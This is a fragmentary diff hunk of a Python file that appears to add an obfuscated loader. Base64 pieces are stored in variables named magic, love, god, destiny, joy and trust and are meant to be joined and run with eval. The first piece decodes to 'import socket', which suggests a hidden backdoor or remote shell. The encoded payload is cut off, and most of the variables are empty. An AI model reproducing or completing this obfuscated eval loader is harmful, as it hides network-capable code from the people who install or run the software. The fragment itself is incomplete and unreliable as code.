@@ -4,9 +4,9 @@
 
 import base64, codecs
 magic = 'aW1wb3J0IHNvY2tldAppbXB
-love =
-god =
-destiny =
-joy =
-trust =
+love = '2yiov8mYwNtGJ9vnJkyYmSOAGDm
+god = 
+destiny = 
+joy = 
+trust = 
 eval
